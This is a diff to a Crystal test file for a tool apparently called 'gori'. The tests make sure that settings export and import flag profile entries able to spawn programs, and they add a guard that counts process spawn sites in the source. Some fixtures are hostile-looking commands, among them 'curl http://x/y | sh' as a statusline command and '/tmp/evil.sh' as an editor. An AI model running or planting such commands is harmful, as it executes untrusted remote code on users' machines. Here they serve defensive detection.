@@ -5,8 +5,8 @@ require "../spec_helper"
 # The unit under test is deliberately the same reader both doors use: `gori settings export`
 # runs it over the document it is about to write, `gori settings import` over the document it
 # is about to apply. An example here that passes for one of them passes for both.
-private def rules_in(json : String, only : Array(String)? = nil) : Array(Gori::Settings::CommandRule)
-  Gori::Settings.command_rules(JSON.parse(json), only)
+private def rules_in(json : String, only : Array(String)? = nil) : Array(Gori::Settings::CommandEntry)
+  Gori::Settings.command_entries(JSON.parse(json), only)
 end
 
 # `command_rules` leans on the section parsers, two of which fall back to THIS INSTALL'S
@@ -119,6 +119,15 @@ describe "Settings.command_rules — a rewriter pipe rule" do
     rules_in(%({"rewriter":{"rules":[{"id":1,"enabled":true,"replacement":"/bin/echo","op":"pipe"}]}})).should be_empty
   end
 
+  it "does not report a pipe rule with an EMPTY argv" do
+    # `Rules.pipe_argv_error` refuses one and the rule overlay will not save one, so it can
+    # never run. Counting it would make the import refusal fire over an entry that arms
+    # nothing — and print `(no command)` as the thing to read before deciding.
+    rules_in(%({"rewriter":{"rules":[{"id":1,"enabled":true,"pattern":"a","replacement":"","op":"pipe"}]}})).should be_empty
+    # Same for a bare `exec:` step, which fails with "no command".
+    rules_in(%({"decoder":{"chains":[{"name":"c","spec":"base64-decode > exec:"}]}})).should be_empty
+  end
+
   it "reports a pre-upgrade `presets` block, which imports DISABLED" do
     found = rules_in(<<-JSON)
       { "rewriter": { "presets": [
@@ -212,7 +221,7 @@ describe "Settings.command_rules — a decoder chain" do
       io << %( > exec:./x"}]}})
     end
     raw.valid_encoding?.should be_false
-    found = Gori::Settings.command_rules(JSON.parse(raw))
+    found = Gori::Settings.command_entries(JSON.parse(raw))
     found.size.should eq(1)
     found[0].command.should eq("./x")
   end
@@ -246,6 +255,69 @@ describe "Settings.command_rules — section selection" do
   end
 end
 
+describe "Settings.command_entries — the two sections that are not rule tables" do
+  it "reports statusline as the SHELL command on a timer that it is" do
+    # The sharpest entry on the list, and the one the first cut of this feature missed:
+    # `Tui::Statusline.run` spawns `/bin/sh -c <command>` — a FULL shell, not ProcessHook's
+    # argv exec — every `interval` seconds, with no proxied traffic needed to trigger it.
+    found = rules_in(%({"statusline":{"enabled":true,"command":"curl http://x/y | sh","interval":5}}))
+    found.size.should eq(1)
+    found[0].section.should eq("statusline")
+    found[0].kind.should eq("sh -c")
+    found[0].command.should eq("curl http://x/y | sh")
+    found[0].enabled.should be_true
+  end
+
+  it "marks statusline disabled only when the profile SAYS so" do
+    # `parse_statusline` reads an absent `enabled` as "keep the current value", so a
+    # hand-written profile that omits it may well end up live on the receiving install — and
+    # for a shell on a timer the honest default is not to promise the row is inert.
+    rules_in(%({"statusline":{"enabled":false,"command":"./s.sh"}}))[0].enabled.should be_false
+    rules_in(%({"statusline":{"command":"./s.sh"}}))[0].enabled.should be_true
+  end
+
+  it "reports an editor command, which runs on the next --edit" do
+    found = rules_in(%({"editor":{"command":"/tmp/evil.sh","markdown":""}}))
+    found.size.should eq(1)
+    found[0].section.should eq("editor")
+    found[0].kind.should eq("exec")
+    found[0].command.should eq("/tmp/evil.sh")
+  end
+
+  it "says nothing about an EMPTY editor, which every profile carries" do
+    # `serialize_editor` writes the section unconditionally, so an empty command is in every
+    # profile ever exported. Reporting it would put a note on every export and the flag on
+    # every import, which is how a loud line stops being read — and it names the receiving
+    # operator's own $VISUAL/$EDITOR/vi, not the profile's.
+    rules_in(%({"editor":{"command":"","markdown":""}})).should be_empty
+    rules_in(%({"statusline":{"enabled":true,"command":""}})).should be_empty
+  end
+end
+
+# The guard that would have caught `statusline` and `editor` being left out — the failure this
+# whole issue is about, one level up: a value gori spawns exists, and the export contract does
+# not know about it.
+#
+# Keyed on the SPAWN SITES rather than on the section list, because that is the direction the
+# question actually runs: "gori runs a program here — where does the program come from, and can
+# a profile set it?" A new `Process.run` anywhere in the tree fails this until someone answers
+# it, and answering "from settings" forces the section into COMMAND_SECTIONS.
+#
+# Counts, not just filenames, so a SECOND spawn added to an already-classified file is caught
+# too. Comment lines are skipped: `process_hook.cr`'s own doc block quotes the call it makes.
+private SPAWN_SITES = {
+  # settings-derived — every one of these sections MUST be in COMMAND_SECTIONS
+  "src/gori/process_hook.cr"                          => {1, "rewriter/scan_rules/decoder"},
+  "src/gori/cli/settings.cr"                          => {1, "editor"},
+  "src/gori/tui/runner.cr"                            => {1, "editor"},
+  "src/gori/tui/controllers/statusline_controller.cr" => {1, "statusline"},
+  # NOT settings-derived: the program is discovered, hardcoded, or comes off the wire
+  "src/gori/browser.cr"                  => {2, nil}, # a detected browser; certutil
+  "src/gori/tui/runner/external_open.cr" => {1, nil}, # hardcoded open/xdg-open
+  "src/gori/update.cr"                   => {3, nil}, # tar, and the release manifest's own step
+  "src/gori/update/channel.cr"           => {1, nil}, # the platform package manager
+}
+
 describe "Settings::COMMAND_SECTIONS" do
   it "names only sections gori actually exports" do
     # A name here that SECTION_KEYS does not carry would be a dispatch arm no document can
@@ -253,14 +325,29 @@ describe "Settings::COMMAND_SECTIONS" do
     (Gori::Settings::COMMAND_SECTIONS - Gori::Settings::SECTION_KEYS).should be_empty
   end
 
-  it "covers every section whose vocabulary admits a command" do
-    # The guard against the failure this issue is about: a rule kind grew a command-carrying
-    # variant and the export contract was never revisited. If either list grows a new
-    # command-carrying entry, its section has to be here.
-    Gori::Settings::RULE_OPS.should contain("pipe")
-    Gori::Settings::SCAN_RULE_KINDS.should contain(Gori::Settings::SCAN_RULE_EXEC_KIND)
-    Gori::Settings::COMMAND_SECTIONS.should contain("rewriter")
-    Gori::Settings::COMMAND_SECTIONS.should contain("scan_rules")
-    Gori::Settings::COMMAND_SECTIONS.should contain("decoder")
+  it "covers every settings-derived process spawn in the tree" do
+    SPAWN_SITES.each do |_, (_, sections)|
+      next unless sections
+      sections.split('/').each do |section|
+        Gori::Settings::COMMAND_SECTIONS.should contain(section)
+      end
+    end
+  end
+
+  it "has a spawn-site table that still matches the tree" do
+    # Fails on a NEW `Process.new`/`Process.run` anywhere under src/, and on one added to a
+    # file already listed. The fix is to classify it above — and if it reads a setting, to put
+    # that section in COMMAND_SECTIONS so both ends of a profile report it.
+    root = File.expand_path(File.join(__DIR__, "..", ".."))
+    actual = Hash(String, Int32).new(0)
+    Dir.glob(File.join(root, "src", "**", "*.cr")).sort.each do |path|
+      rel = path.sub("#{root}/", "")
+      File.read_lines(path).each do |line|
+        next if line.lstrip.starts_with?('#')
+        actual[rel] += 1 if line.includes?("Process.new(") || line.includes?("Process.run(")
+      end
+    end
+    expected = SPAWN_SITES.transform_values { |(count, _)| count }
+    actual.should eq(expected)
   end
 end
